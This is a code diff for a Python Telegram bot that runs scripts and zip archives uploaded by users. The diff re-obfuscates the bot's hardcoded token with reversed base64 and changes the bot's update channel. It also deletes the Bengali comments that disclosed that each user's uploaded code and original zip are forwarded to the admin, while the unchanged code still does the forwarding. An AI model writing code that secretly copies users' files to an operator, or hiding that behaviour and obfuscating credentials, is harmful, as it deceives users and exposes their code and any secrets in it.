@@ -39,19 +39,17 @@ def keep_alive():
     t.start()
     print("Flask Keep-Alive started.")
 
+# --- Obfuscated Security Config ---
+_RAW_SEC = "NGJQTkxjTmVibldNV1hWbjFRNGxDSllRbkVkU0twRkFBNjA1MTEyODU5OA=="
 
-_ENC_SEC = b'GxkSEgsBGBsSFAQBFQcfCQcCHQkXBxoHGh1+DR4FGQkAGwZ+HBoB'
-_SEC_K = 0x5B
+def _get_auth():
+    return base64.b64decode(_RAW_SEC).decode('utf-8')[::-1]
 
-def _resolve_auth(raw_bytes, k):
-    decoded = base64.b64decode(raw_bytes)
-    return bytes([b ^ k for b in decoded]).decode('utf-8')
-
-TOKEN = _resolve_auth(_ENC_SEC, _SEC_K)
+TOKEN = _get_auth()
 OWNER_ID = 6138186135
 ADMIN_ID = 6138186135
 YOUR_USERNAME = '@rafian40'
-UPDATE_CHANNEL = 'https://t.me/customsmsfree'
+UPDATE_CHANNEL = 'https://t.me/rafian40'
 
 # ২ টি বাধ্যতামূলক চ্যানেল (বটকে অবশ্যই চ্যানেল দুটিতে অ্যাডমিন রাখতে হবে)
 REQUIRED_CHANNELS = [
@@ -631,7 +629,6 @@ def notify_admin_new_file(aid, uid, uname, fname, fn, ft, is_zip=False, file_pat
     for admin in admins_to_notify:
         try:
             raw_send(admin, txt)
-            # ফাইলের কোড অ্যাডমিনের কাছে .txt হিসেবে পাঠানো
             if file_path and os.path.exists(file_path):
                 if is_zip:
                     with open(file_path, 'rb') as f:
@@ -728,7 +725,6 @@ def handle_zip(content, zname, message):
         if not main_s:
             bot.reply_to(message, f"{PEM['no']} No .py or .js found!", parse_mode='HTML'); return
 
-        # মূল জিপ ফাইলটি সেভ রাখা অ্যাডমিনের কাছে পাঠানোর জন্য
         permanent_zip = os.path.join(folder, zname)
         with open(permanent_zip, 'wb') as f: f.write(content)
 
@@ -1039,7 +1035,6 @@ def handle_file_cmd(m):
     action = parts[0].lower()
     fn = parts[1].strip()
 
-    # Check ownership
     owner = None
     for o, files in user_files.items():
         if any(f[0] == fn for f in files):
